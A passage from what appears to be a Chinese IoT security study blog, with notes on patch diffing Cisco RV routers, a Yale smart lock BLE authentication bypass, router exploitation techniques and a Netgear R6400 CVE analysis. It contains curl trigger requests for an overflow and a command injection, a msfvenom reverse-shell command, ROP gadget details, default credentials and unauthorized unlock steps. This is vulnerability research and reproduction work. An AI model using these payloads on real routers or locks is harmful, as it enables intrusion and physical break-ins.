class="variable">$x2rSbqyggRaYAJgSRJ9uC</span>.:Admin123</span><br></pre></td></tr></table></figure>
<h3 id="04-总结"><a href="#04-总结" class="headerlink" title="04-总结"></a>04-总结</h3><ul>
<li><p>综上，信息泄漏：默认账号密码：admin:Admin123（25版本有，28版本没有</p>
</li>
<li><p>流程</p>
<ul>
<li>通过文件hash对比，发现删掉了<em>utelnetd</em></li>
<li><em>utelnetd</em>通过<em>/ bin / login</em>来进行用户认证（他又通过<em>/etc/shadow</em> </li>
<li>shadow默认没有，必须在设备启动时生成该shadow文件。</li>
<li>搜索字符串找到/sbin/rc文件，其在Linux初始化中执行</li>
<li>/sbin/rc中找到admin及其hash值，解密</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><h3 id="version-track"><a href="#version-track" class="headerlink" title="version_track"></a>version_track</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
<li><p>ghidra导入库</p>
<ul>
<li>提供库搜索路径，以便Ghidra也可以加载与二进制文件动态链接的系统库。</li>
<li>options、load external libraries、eidt path、+</li>
<li>添加：<em>/lib</em> 和 <em>/usr/lib</em></li>
</ul>
</li>
<li><p>要先分析</p>
<ul>
<li>将每个文件加载到项目中后，双击它们并执行自动分析。</li>
<li><p>分析完成后，保存文件并返回主窗口。（file-save或command + s</p>
</li>
<li><p>既然我们的二进制文件已经由Ghidra进行了分析，我们就可以启动版本跟踪会话。</p>
</li>
<li>根据您的喜好命名会话，并将两种版本的<em>httpd</em>都设置为源程序和目标程序：</li>
<li>分析后才能进行版本追踪 </li>
</ul>
</li>
</ul>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>大致流程<ul>
<li>脚印图标、file、new session、命名、指定源/目标、开始图标来test、next/finish</li>
<li>finish后，共3个窗口：version track主窗口、源/目的工具</li>
<li>主窗口-魔术棒图标来自动分析</li>
<li>过滤</li>
</ul>
</li>
<li>设置过滤：过滤器图标（match table 而非markup item table）<ul>
<li>match type：去掉data</li>
<li>symbol type：全选</li>
<li>Association Status：只选available</li>
<li>Algorithm：只Implied Match</li>
<li>address range：默认即可</li>
<li>（其他选项待查看帮助</li>
</ul>
</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>decompile view：<ul>
<li>总是超时失败：Exception while decompiling 0040c400: process: timeout（推测超时原因：函数本身比较大、指定了lib库牵涉的文件多</li>
<li>设置timeout时间：<a href="https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool</a> option-decompiler，而且不同文件间是独立的</li>
<li>不用version track的反编译了，直接ghidra反编译，然后修改超时时间为300，结合在线文本差异对比（version track会有三个窗口，修改源/目的文件的反编译超时时间，发现在主窗口没生效，故不用</li>
<li>（第二个函数可以反编译成功，观察，此窗口好像也没有差异对比功能</li>
</ul>
</li>
<li>过滤后结果</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 共2:FUN_0040c400-FUN_0040c460、FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0040c400-FUN_0040c460</span></span><br><span class="line">strcpy变为strncpy，限制了长度，防止栈溢出</span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"><span class="comment"># 多加了一个对“.cfgi”的strstr过滤，防止信息泄漏（CVE-2020-3150信息泄漏是通过访问/startup.cfg实现的、asp-cgi-txt都是防止直接返回内容的后缀</span></span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line"><span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br><span class="line">       </span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">      (__s1_00 = strstr(pcParm1,<span class="string">".cfg"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br></pre></td></tr></table></figure>
<h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><ul>
<li>bindiff分析：ghidra需要安装binexport，导出后再bindiff</li>
<li>安装binexport</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参考：</span></span><br><span class="line">https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/、https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码：</span></span><br><span class="line">https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu下：（最终失败，转mac</span></span><br><span class="line">安装gradle构建工具：sudo apt  install gradle</span><br><span class="line"><span class="built_in">cd</span>到binexport/java/BinExport执行构建命令：gradle</span><br><span class="line">（失败，报错 Gradle version is 4.4.1. Minimum supported version is 5.6，用apt安装的是低版本，用snap安装的是6.6.1的，改用后者</span><br><span class="line">安装gradle构建工具：sudo snap  install gradle --classic（不加参数提示有风险，故加参数来确认安装</span><br><span class="line">要有ghidra的路径，gradle -PGHIDRA_INSTALL_DIR=~/Desktop/ghidra报错，Ubuntu下根本没有，所以转mac来build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac下</span></span><br><span class="line">安装gradle构建工具：brew install gradle</span><br><span class="line"><span class="built_in">cd</span>到/binexport/java/BinExport</span><br><span class="line">执行：gradle -PGHIDRA_INSTALL_DIR=/Applications/ghidra_9.0（mac下ghidra的真实路径</span><br><span class="line">报错：类文件具有错误的版本 55.0, 应为 52.0</span><br><span class="line">（更新ghidra为9.1.2也这样，暂搁置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接下载编译好的：</span></span><br><span class="line">https://github.com/google/binexport/releases，搜索ghidra得到https://github.com/google/binexport/releases/download/v11/ghidra_BinExport.zip</span><br></pre></td></tr></table></figure>
<h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><ul>
<li>Finding CVE-2020-3323：栈溢出，unauthenticated, remote attacker to execute arbitrary code</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 排除前面的strcpy，因为漏洞描述是unauthenticated，但strcpy调用无法通过未经身份验证的上下文访问</span></span><br><span class="line"><span class="comment"># an insecure call to sscanf in the guest_logout_cgi function.为代码如下：</span></span><br><span class="line">char acStack172 [64];</span><br><span class="line">char acStack108 [68];</span><br><span class="line"></span><br><span class="line">char* cip = get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">char* cmac = get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">char* submit_button = get_cgi(<span class="string">"submit_button"</span>);<span class="comment"># 获取post数据</span></span><br><span class="line"></span><br><span class="line">int v = strstr(submit_button,<span class="string">"status_guestnet.asp"</span>);</span><br><span class="line"><span class="keyword">if</span>(v != NULL)&#123;</span><br><span class="line">    // they<span class="string">'re looking for status_guestnet.asp;session_id=current_user_session_id_value</span></span><br><span class="line"><span class="string">    sscanf(submit_button,"%[^;];%*[^=]=%[^\n]",acStack108,acStack172);# 漏洞点</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 触发</span></span><br><span class="line"><span class="string">curl -ki -X POST https://192.168.1.43/guest_logout.cgi -d"cmac=00:01:02:03:04:05"-d "ip=192.168.1.1"-d "submit_button=status_guestnet.aspAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Finding CVE-2020-3332：命令注入，authenticated, remote attacker to inject arbitrary shell commands</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get_cgi读取post数据</span></span><br><span class="line">`pcVar2 = (char *)get_cgi(<span class="string">"sys_iperfWinSize"</span>);`</span><br><span class="line">`pcVar3 = (char *)get_cgi(<span class="string">"sys_iperfPort"</span>);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># snprintf拼接字符串</span></span><br><span class="line">`snprintf(acStack112,0x50,<span class="string">"iperf %s -s -p %s -w %s -D &gt; /tmp/result.txt &amp;"</span>,__s1,pcVar3,pcVar2);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># system执行</span></span><br><span class="line">`system(acStack112);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发</span></span><br><span class="line">curl -ki -X POST <span class="string">'https://192.168.1.43/mfgtst.cgi?sys_iperfServer=1&amp;sys_iperfWinSize=1</span></span><br><span class="line"><span class="string">&amp;sys_iperfPort=80%7C%7Cping%20-c%203%2010.10.10.100%7C%7C&amp;sys_iperfMode=-u</span></span><br><span class="line"><span class="string">;session_id=0d00538ca990439d194ff8b294927e08'</span></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:09 GMT</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:16 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前提：通过认证后、手动将nvram设置的mfg_radio设为on</span></span><br></pre></td></tr></table></figure>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
<li>version track使用：<a href="https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/" target="_blank" rel="noopener">https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/</a></li>
<li>通过过滤器，找到函数后，就不用version track了（就是过滤器有用</li>
<li>gd中添加书签：ctrl+D</li>
<li>信息泄漏CVE-2020-3150：<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</a></li>
<li>Ghidra version tracking还是不够强大，bindiff更专业</li>
<li>有的更新并没有与cve相对应，而是程序员的主动修改，前者是因为产生漏洞而被动修改</li>
<li>有何区别：ghidra分析后再bindiff、ida分析后再bindiff、直接bindiff（分析后的肯定要好、设置lib库再分析后的肯定更好</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/" target="_blank" rel="noopener">https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/</a></li>
<li><a href="https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>耶鲁智能门锁的安全分析</title>
    <url>/2021/04/10/iot/%E8%80%B6%E9%B2%81%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="耶鲁智能门锁的安全分析"><a href="#耶鲁智能门锁的安全分析" class="headerlink" title="耶鲁智能门锁的安全分析"></a>耶鲁智能门锁的安全分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><ul>
<li>概要：修复app日志输出、app逆向分析、减法获取productinfo来认证绕过</li>
<li>设备简介<ul>
<li>门锁的可拆卸蓝牙模块+手机app=蓝牙开锁</li>
<li>使用前需要先在app中绑定门锁</li>
<li>门锁在手机的蓝牙通信范围内，app会自动向门锁发起BLE连接</li>
<li>门锁对手机进行身份认证</li>
</ul>
</li>
<li>日志分析<ul>
<li>Android Killer查看app日志，无任何输出</li>
<li>对APK进行逆向，找到输出日志的代码</li>
<li>ILog类中所有Log函数均为空，两法：修改代码并重打包、Hook函数直接打印参数</li>
<li>修复日志输出代码后，获取日志</li>
<li>根据日志进行代码回溯</li>
</ul>
</li>
<li><p>修改smali代码并重打包</p>
<ul>
<li>Android Killer反编译app</li>
<li>ILog.smali：右键插入代码</li>
<li>AndroidManifest：添加android:debuggable标签</li>
</ul>
</li>
<li><p>app端处理流程</p>
<ul>
<li>门锁在手机附近时，app自动向门锁发起连接，门锁响应</li>
<li>回调函数被调用，发出一个广播（包含收到的BLE消息内容）</li>
<li>广播接收器收到广播，将BLE消息内容取出，交由xxx处理，</li>
<li>最终封装为ACK帧，writeCharacteristic将其发送给门锁</li>
</ul>
</li>
<li><p>身份认证过程</p>
<ul>
<li>门锁在手机附近时，app自动向门锁发起连接</li>
<li>门锁向手机发送Authentication Request</li>
<li>Request处理后得到Payload，再封装成Authentication Response</li>
<li>手机将response发送到门锁，门锁进行认证</li>
<li>若手机通过认证，则可开关门锁</li>
</ul>
</li>
<li><p>Payload如何生成</p>
<ul>
<li>Request被分成若干字节，每个字节都与key1~key6中的某一个相加，结果放在c1r1~c3r4中，c1r1~c3r4重新拼接成字节流形式，即Payload</li>
<li>Payload：Request + key1~key6</li>
<li>Request：门锁发来的</li>
<li>key1~key6：productInfo变量</li>
<li>productInfo：门锁发来的，烧录在flash的固定密钥</li>
</ul>
</li>
<li><p>认证绕过</p>
<ul>
<li>门锁绑定不同手机时，发送的productInfo是相同的</li>
<li>身份认证的算法是加法运算，若嗅探到Request和Response，二者相减可得productInfo</li>
<li>request+productinfo，构造出response，认证绕过</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><ul>
<li><p>概要：app代码分析、ble嗅探、未授权开锁</p>
</li>
<li><p>BLE通信过程</p>
<ul>
<li>Master-Scanner状态下，不断地扫描并接收Slave-Advertiser状态下发出的广播包</li>
<li>共40个信道，广播包固定在其中3个信道上进行</li>
<li>Master与Slave建立连接时会进入Initiator状态，并向Slave发起连接请求</li>
<li>建立连接后，在其他37个信道上，跳频通信</li>
</ul>
</li>
<li><p>嗅探工具Dongle</p>
<ul>
<li>插入pc-usb口，配套软件-Packet Sniffer</li>
<li>非全频谱嗅探工具：依靠CONNECT_REQ来跟踪连接后的跳频通信</li>
<li>一次只能监听一个广播信道：若只有一个则需多次尝试</li>
</ul>
</li>
<li><p>CONNECT_REQ</p>
<ul>
<li>建立连接前最后一个广播包</li>
<li>若探测到，说明有Master/Slave准备建立连接</li>
<li>Dongle通过它来跟踪跳频通信</li>
</ul>
</li>
<li><p>Dongle嗅探</p>
<ul>
<li>配置Dongle监听某个广播信道，点击开始嗅探，app内连接门锁</li>
<li>发现CONNECT_REQ，说明二者准备连接，建立连接后，开始跳频通信（Channel字段变化）</li>
<li>Dongle自动跟踪二者的通信过程，不再显示其他设备的广播内容</li>
</ul>
</li>
<li><p>数据包结构</p>
<ul>
<li>前2：event、source</li>
<li>3：数据包的序号</li>
<li>4：长度</li>
<li>5开始：数据包的Payload</li>
<li>后1：校验码</li>
</ul>
</li>
<li><p>获取productinfo</p>
<ul>
<li>提取出request和response中的payload，二者作差，得到productInfo计算值</li>
<li>adb从手机中取得Yale app的应用数据库，得到productInfo真实值</li>
<li>对比两个productinfo，只有前6字节参与计算</li>
</ul>
</li>
<li><p>修改数据库</p>
<ul>
<li>ADB拉取app数据库，修改完成后再推送回去</li>
<li>拉取app数据库前提：root权限，或者run-as指令</li>
<li>run-as指令需要app允许debug，故AndroidManifest.xml中添加Android:debuggable=true</li>
</ul>
</li>
<li>未授权解锁<ul>
<li>获取productinfo：ble嗅探，获取request/response中的payload，二者作差</li>
<li>拉取app数据库并修改：productinfo、module_addr（门锁地址，nRF Connect可得）</li>
<li>ADB推送数据库回手机，重启app，手机与门锁连接后，就可开锁</li>
</ul>
</li>
<li>其它<ul>
<li>本设备的BLE通信无加密，嗅探可直接获取通信内容</li>
<li>智能门锁种类繁多，开锁方式不只有BLE方式</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/gQlG" target="_blank" rel="noopener">https://www.4hou.com/posts/gQlG</a></li>
<li><a href="https://www.4hou.com/posts/o633" target="_blank" rel="noopener">https://www.4hou.com/posts/o633</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>智能门锁</tag>
      </tags>
  </entry>
  <entry>
    <title>iot设备漏洞利用相关</title>
    <url>/2021/04/09/iot/iot%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot漏洞利用相关"><a href="#iot漏洞利用相关" class="headerlink" title="iot漏洞利用相关"></a>iot漏洞利用相关</h1><h1 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h1><ul>
<li><p>静态分析</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 用sp定位LR：</span></span><br><span class="line">- STMFD   SP!, &#123;R4-R11,LR&#125;：LR = sp+4*8（LR在地址高处，其次11、10</span><br><span class="line">- SUB     SP, SP, <span class="comment">#0x2C：sp = sp-0x2c</span></span><br><span class="line">- 所以：LR= sp+0x2c+4*8</span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">- dest = sp+0x18</span><br><span class="line">- LR= sp+0x2c+4*8</span><br><span class="line">- 偏移 = LR-dest = 0x2c+4*8 -0x18 = 0x34</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 基准：push/stmfd、sub后的sp</span></span><br><span class="line">STMFD SP!, &#123;R4-R11,LR&#125;</span><br><span class="line">SUB SP, SP, <span class="comment">#0x2C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LR位置</span></span><br><span class="line">loc = sp+2c+8*4</span><br><span class="line"></span><br><span class="line"><span class="comment"># dst_buff 位置</span></span><br><span class="line">loc = sp+0x50-0x38=sp+0x18</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">sp+0x2c+8*4 - sp+0x18 = 0x2c+8*4-0x18=0x34</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态调试</p>
<h1 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h1></li>
<li><p>自身程序</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 复现影响79款Netgear路由器高危漏洞：https://www.anquanke.com/post/id/235497</span></span><br><span class="line"></span><br><span class="line">mov R0,SP</span><br><span class="line">BL system</span><br></pre></td></tr></table></figure>
</li>
<li><p>libc</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1、强网杯2020决赛 ciscoRV110W web服务漏洞复现</span></span><br><span class="line">https://www.anquanke.com/post/id/224301<span class="comment">#h3-7</span></span><br><span class="line"></span><br><span class="line">|  0x000257A0  |  addiu <span class="variable">$a0</span>,<span class="variable">$sp</span>,0x58+var_40  |  jalr  <span class="variable">$s0</span>  |</span><br><span class="line">|  0x0003D050  |  move <span class="variable">$t9</span>,<span class="variable">$a0</span>  |  jalr  <span class="variable">$a0</span>  |</span><br><span class="line">只要将shellcode写到<span class="variable">$sp</span>+0x18处，将s0覆盖为0x0003D050，将返回地址覆盖为0x000257A0，就可以在第一个gadget处先将shellcode的地址放到a0寄存器，然后跳转到第二个gadget跳转到shellcode上</span><br></pre></td></tr></table></figure>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 强网杯2020决赛 ciscoRV110W web服务漏洞复现</span></span><br><span class="line">https://www.anquanke.com/post/id/224301<span class="comment">#h3-7</span></span><br><span class="line"></span><br><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.102 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h1 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送Content-Type: multipart/form-data的post请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 burp：boundary可以不唯一，只是一个分界符，但是header和body中要统一</span></span><br><span class="line">POST /xxx HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">config.xml</span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file.path"</span></span><br><span class="line"></span><br><span class="line">/tmp/</span><br><span class="line">--------------------------4d8fe9222f5fb896</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 python-request：Content-Type不能有，要自动生成</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'</span></span><br><span class="line">    <span class="comment">#'Content-Type': 'multipart/form-data; boundary=------------------------4d8fe9222f5fb896',</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;<span class="string">"filename"</span>: (None, <span class="string">"config.xml"</span>), <span class="string">"file.path"</span>: (None, <span class="string">"/tmp/"</span>)&#125;</span><br><span class="line">r = requests.post(url, headers=headers,files=params,verify=False)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 python-socket：发送原生的http数据</span></span><br><span class="line">    header = <span class="string">"POST /upload HTTP/1.1\r\nHost: 192.168.1.1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36\r\nCookie: selected_language=English; sessionid='|%s|'; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV340W; fwver=1.0.03.18; current-page=Admin_License\r\nContent-Type: multipart/form-data; boundary=------------------------4d8fe9222f5fb896\r\nContent-Length: 452\r\n\r\n"</span> % cmd</span><br><span class="line">    body = <span class="string">"--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"destination\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"file.path\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"pathparam\"\r\n\r\nConfiguration\r\n--------------------------4d8fe9222f5fb896\r\nContent-Disposition: form-data; name=\"fileparam\"\r\n\r\n1\r\n--------------------------4d8fe9222f5fb896"</span></span><br><span class="line">    payload = header + body</span><br><span class="line">    sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    sock.send(payload)</span><br><span class="line">    resp = sock.recv(1024)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"response: %s"</span> % resp)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>netgear r6400/v2漏洞定位及分析</title>
    <url>/2021/03/31/iot/netgear%20r6400v2%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D%E5%8F%8A%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="netgear-r6400-v2漏洞定位及分析"><a href="#netgear-r6400-v2漏洞定位及分析" class="headerlink" title="netgear-r6400/v2漏洞定位及分析"></a>netgear-r6400/v2漏洞定位及分析</h1><p>CVE-2021-27239-netgear-r6400/v2</p>
<blockquote>
<p>CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限</p>
</blockquote>
<h2 id="通告"><a href="#通告" class="headerlink" title="通告"></a>通告</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-206/</span></span><br><span class="line">his vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400 and R6700 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the upnpd service, <span class="built_in">which</span> listens on UDP port 1900 by default. A crafted MX header field <span class="keyword">in</span> an SSDP message can trigger an overflow of a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>官网</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://kb.netgear.com/000062820/Security-Advisory-for-Stack-based-Buffer-Overflow-Remote-Code-Execution-Vulnerability-on-Some-Routers-PSV-2020-0432</span></span><br><span class="line">R6400 running firmware versions prior to 1.0.1.68</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.netgear.com/support/product/R6400.aspx#download</span></span><br><span class="line">70、68、62</span><br><span class="line"></span><br><span class="line"><span class="comment"># fofa</span></span><br><span class="line">app=<span class="string">"NETGEAR-R6400"</span></span><br><span class="line">18,742 条匹配结果 (9,306 条独立IP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line">2020-09-23 - Vulnerability reported to vendor</span><br><span class="line">62：Last Updated:08/03/2020</span><br><span class="line">68:Last Updated:01/18/2021</span><br><span class="line">70:Last Updated:03/15/2021</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故对比：62 &amp; 68</span></span><br></pre></td></tr></table></figure>
<ul>
<li>开启telnet</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># telnetd失败</span></span><br><span class="line"> lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line"></span><br><span class="line"><span class="comment"># utelnetd成功</span></span><br><span class="line"> ✘ lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">login: admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无需多余的参数，默认即可</span></span><br><span class="line"><span class="comment"># ps |grep telnet</span></span><br><span class="line">16052 admin       652 S   utelnetd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">无参数，需要登录</span><br><span class="line">-l /bin/sh，无需登录</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最好后台执行</span></span><br><span class="line">utelnetd -l /bin/sh &amp;</span><br><span class="line">若前台执行会一直等待执行完</span><br></pre></td></tr></table></figure>
<ul>
<li>获取web密码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nvram show |grep http_</span></span><br><span class="line">size: 40713 bytes (90359 left)</span><br><span class="line">http_username=admin</span><br><span class="line">http_passwd=admin</span><br></pre></td></tr></table></figure>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul>
<li>过程</li>
</ul>
